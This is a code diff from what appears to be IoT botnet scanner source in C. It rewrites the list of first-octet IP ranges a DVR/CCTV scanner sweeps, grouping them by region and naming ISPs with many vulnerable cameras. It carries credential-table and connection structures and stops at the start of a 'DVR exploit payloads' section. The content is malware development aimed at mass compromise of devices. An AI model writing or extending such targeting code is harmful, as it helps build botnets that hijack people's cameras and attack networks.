@@ -30,7 +30,30 @@ struct dvr_scanner_auth *dvr_auth_table = NULL;
 struct dvr_scanner_connection *conn_table;
 uint16_t dvr_dvr_auth_table_max_weight = 0;
 uint32_t dvr_fake_time = 0;
-int dvr_ranges[] = {223,222,221,220,219,218,217,213,212,211,210,203,202,201,200,199,198,197,196,195,194,193,192,191,190,189,188,187,186,185,184,183,182,181,180,179,178,177,176,175,174,173,172,171,170,169,168,167,166,165,164,163,162,161,160,159,158,157,156,155,154,153,126,125,124,123,122,121,120,119,118,117,116,115,114,113,112,111,110,109,108,107,106,105,104,103,102,101,95,94,93,92,91,90,89,88,87,86,85,84,83,82,81,80,63,62,61,60,59,58,57,56,55,54,53,52,51,50,49,48,47,46,45,44,43,42,41,40,39,38,37,36,27,14,2,1};
+/* DVR scanner IP ranges - targets CCTV/DVR ISPs
+ * Global coverage: All regions with CCTV/DVR deployments
+ * Focus: Asia, Middle East, Africa, Latin America where DVR cameras are prevalent
+ * Major ISPs: BSNL, Airtel, Viettel, STC, Etisalat, Claro, Movistar
+ */
+int dvr_ranges[] = {
+    /* Asia - DVR hotspot (China, India, Vietnam, Thailand, Indonesia) */
+    125,124,123,122,121,120,119,118,117,116,115,114,113,112,111,110,
+    109,108,107,106,105,104,103,102,101,
+    /* Middle East */
+    95,94,93,92,91,90,89,88,87,86,85,84,83,82,81,80,
+    /* Africa */
+    197,196,195,194,193,192,165,164,163,162,161,160,159,158,157,156,155,154,153,
+    /* Latin America */
+    201,200,191,190,189,187,186,181,180,179,177,
+    /* Europe - Eastern/Southern DVR presence */
+    79,78,77,76,75,74,73,72,71,70,69,68,67,66,65,
+    /* Asia-Pacific (Australia, Pacific) */
+    203,202,210,211,218,219,220,
+    /* North America - Limited DVR coverage */
+    63,62,61,60,59,58,57,56,55,54,53,52,51,50,49,48,47,46,45,44,43,42,41,40,
+    39,38,37,36,27,14,2,1,
+    -1
+};
 
 /* DVR exploit payloads */
 static char *dvr_payload_cmd = 
